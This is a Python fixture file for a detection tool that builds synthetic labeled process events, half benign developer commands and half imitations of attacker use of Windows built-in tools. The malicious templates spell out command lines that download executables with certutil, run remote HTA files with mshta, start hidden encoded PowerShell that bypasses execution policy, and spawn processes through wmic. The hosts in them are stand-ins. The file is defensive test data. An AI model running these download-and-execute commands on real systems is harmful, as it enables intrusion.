"""Original synthetic fixtures for offline wiring tests.

These are hand-authored, NOT captured telemetry. Every record is labeled
`label_source=synthetic_fixture` / `category=synthetic_fixture`. Results on this
corpus are smoke tests, never detection benchmarks.

Each template produces several near-duplicate variants sharing a `template_id`; the
splitter must keep a template's variants together. Malicious templates represent
*controlled* lab-style executions, not observed intrusions.
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from copley.data.serialize import SERIALIZER_VERSION
from copley.schemas import (
    TASK_PROCESS_EXECUTION,
    Annotation,
    EvidenceWindow,
    Grouping,
    Label,
    LabeledWindow,
    LabelSource,
    ProcessEvent,
    Provenance,
    ProvenanceCategory,
    ReviewStatus,
)

_BASE = datetime(2026, 10, 1, 12, 0, 0, tzinfo=UTC)
DATASET_ID = "copley-synthetic-fixtures-v1"


def _prov(category: ProvenanceCategory) -> Provenance:
    return Provenance(
        dataset_id=DATASET_ID,
        source_id="copley.synthetic",
        category=category,
        upstream_url=None,
        license="Apache-2.0",
        redistribution="allowed",
        preprocessing_version=SERIALIZER_VERSION,
    )


def _window(
    wid: str,
    *,
    offset_min: int,
    image: str,
    cmd: str,
    parent_image: str | None,
    parent_cmd: str | None,
    original_file_name: str | None = None,
    integrity: str = "Medium",
) -> EvidenceWindow:
    ts = _BASE + timedelta(minutes=offset_min)
    ev = ProcessEvent(
        event_id=f"{wid}-e0",
        timestamp=ts,
        observed_at=ts,
        host=f"WORKSTATION-{offset_min % 5:02d}",
        image=image,
        original_file_name=original_file_name,
        command_line=cmd,
        current_directory="C:\\Users\\analyst\\",
        integrity_level=integrity,
        user="CORP\\analyst",
        process_id=str(4000 + offset_min),
        parent_image=parent_image,
        parent_command_line=parent_cmd,
        parent_process_id=str(2000 + offset_min),
    )
    return EvidenceWindow(
        window_id=wid,
        task_id=TASK_PROCESS_EXECUTION,
        as_of=ts + timedelta(seconds=30),
        anchor_event_id=ev.event_id,
        events=[ev],
    )


def _labeled(
    win: EvidenceWindow, label: Label, category: ProvenanceCategory, template: str
) -> LabeledWindow:
    source = {
        Label.benign: LabelSource.known_controlled_execution,
        Label.malicious: LabelSource.known_controlled_execution,
        Label.unlabeled: LabelSource.none,
    }[label]
    return LabeledWindow(
        evidence=win,
        annotation=Annotation(
            label=label,
            label_source=source,
            review_status=ReviewStatus.not_applicable,
            notes="Synthetic fixture; not observed telemetry.",
            provenance=_prov(category),
            grouping=Grouping(template_id=template, scenario_id=f"scenario-{template}"),
        ),
    )


# Template specs: (template_id, label, category, [variants]) where each variant is a
# dict of overrides. Benign templates mimic ordinary admin/dev activity; malicious ones
# mimic controlled LOLBIN executions matching the selected Sigma rules.
_MAL_TEMPLATES = [
    (
        "certutil_download",
        [
            "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe",
            "certutil  -urlcache -f https://example.invalid/payload.bin p.bin",
            "certutil.exe -verifyctl -f -split http://203.0.113.5/x x.dll",
        ],
        "C:\\Windows\\System32\\certutil.exe",
        "CertUtil.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "cmd.exe /c download",
    ),
    (
        "powershell_b64",
        [
            "powershell.exe -nop -w hidden -enc JABzPQBOZXc= ",
            "powershell -ep bypass -enc SUVYIABpAGUAeAA= ",
            "pwsh.exe -NoProfile -EncodedCommand aQBlAHgAIAA= ",
        ],
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "PowerShell.EXE",
        "C:\\Windows\\explorer.exe",
        "explorer.exe",
    ),
    (
        "mshta_http",
        [
            "mshta.exe http://198.51.100.20/a.hta",
            "mshta https://example.invalid/b.hta",
            "mshta.exe http://203.0.113.44/c.hta ",
        ],
        "C:\\Windows\\System32\\mshta.exe",
        "MSHTA.EXE",
        "C:\\Windows\\System32\\wscript.exe",
        "wscript.exe run.vbs",
    ),
    (
        "wmic_process_create",
        [
            'wmic process call create "calc.exe"',
            "wmic  process call create 'notepad.exe'",
            "wmic process call create cmd.exe",
        ],
        "C:\\Windows\\System32\\wbem\\WMIC.exe",
        "wmic.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "cmd.exe /c wmic",
    ),
]

_BENIGN_TEMPLATES = [
    (
        "git_status",
        [
            "git status",
            "git  status -s",
            "git status --porcelain",
        ],
        "C:\\Program Files\\Git\\cmd\\git.exe",
        "git.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "cmd.exe",
    ),
    (
        "python_script",
        [
            "python.exe train.py --epochs 3",
            "python train.py --config configs/smoke.yaml",
            "python.exe -m pytest tests/",
        ],
        "C:\\Python312\\python.exe",
        "python.exe",
        "C:\\Program Files\\Microsoft VS Code\\Code.exe",
        "Code.exe",
    ),
    (
        "msbuild",
        [
            "MSBuild.exe Solution.sln /p:Configuration=Release",
            "msbuild App.csproj /t:Build",
            "MSBuild.exe /m /p:Platform=x64 Build.proj",
        ],
        "C:\\Program Files\\Microsoft Visual Studio\\MSBuild\\Current\\Bin\\MSBuild.exe",
        "MSBuild.exe",
        "C:\\Program Files\\Microsoft Visual Studio\\devenv.exe",
        "devenv.exe",
    ),
    (
        "powershell_admin",
        [
            "powershell.exe -NoProfile -Command Get-Service",
            "powershell -Command Get-ChildItem C:\\logs",
            "powershell.exe Get-Process | Sort CPU",
        ],
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "PowerShell.EXE",
        "C:\\Windows\\explorer.exe",
        "explorer.exe",
    ),
    (
        "whoami_plain",
        [
            "whoami",
            "whoami /user",
            "whoami.exe",
        ],
        "C:\\Windows\\System32\\whoami.exe",
        "whoami.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "cmd.exe",
    ),
]


def build_fixtures() -> list[LabeledWindow]:
    out: list[LabeledWindow] = []
    idx = 0
    for template, cmds, image, ofn, pimg, pcmd in _MAL_TEMPLATES:
        for v, cmd in enumerate(cmds):
            win = _window(
                f"mal-{template}-{v}",
                offset_min=idx,
                image=image,
                cmd=cmd,
                parent_image=pimg,
                parent_cmd=pcmd,
                original_file_name=ofn,
                integrity="High" if v == 0 else "Medium",
            )
            out.append(
                _labeled(
                    win, Label.malicious, ProvenanceCategory.controlled_attack_execution, template
                )
            )
            idx += 1
    for template, cmds, image, ofn, pimg, pcmd in _BENIGN_TEMPLATES:
        for v, cmd in enumerate(cmds):
            win = _window(
                f"ben-{template}-{v}",
                offset_min=idx,
                image=image,
                cmd=cmd,
                parent_image=pimg,
                parent_cmd=pcmd,
                original_file_name=ofn,
            )
            out.append(_labeled(win, Label.benign, ProvenanceCategory.benign_operations, template))
            idx += 1
    return out
